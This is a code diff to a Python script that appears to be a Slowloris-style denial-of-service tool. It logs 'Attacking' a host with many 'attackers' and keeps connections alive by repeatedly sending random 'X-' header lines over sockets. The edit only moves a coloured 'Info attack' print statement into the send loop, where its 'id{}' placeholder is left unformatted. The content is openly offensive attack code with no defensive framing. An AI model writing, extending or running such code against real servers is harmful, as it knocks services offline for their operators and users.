@@ -87,7 +87,6 @@ def init_attack(nAttackers):
 def main():
     logging.info("Attacking {} with {} attackers".format(host, connections))  
     logging.info("Establishing connections..")
-    print("\033[48;5;7m\033[38;5;0mInfo attack\033[0m \033[38;5;2m" +str(url)+ "\033[37m" +id+ "")
     attackers = []
 
     for x in range((connections)):
@@ -102,6 +101,7 @@ def main():
             for s in list(attackers):
                 try:
                     s.socket.send("X-{}: {}\r\n".format(randint(0, 50000), randint(0, 50000)).encode())
+                    print("\033[48;5;7m\033[38;5;0mInfo attack\033[0m \033[38;5;2mid{} \033[37m" +ip+ "")
                 except socket.error as error:
                     logging.debug("Dead attacker: {} | Exception: {}".format(s.id, error))
                     attackers.remove(s)
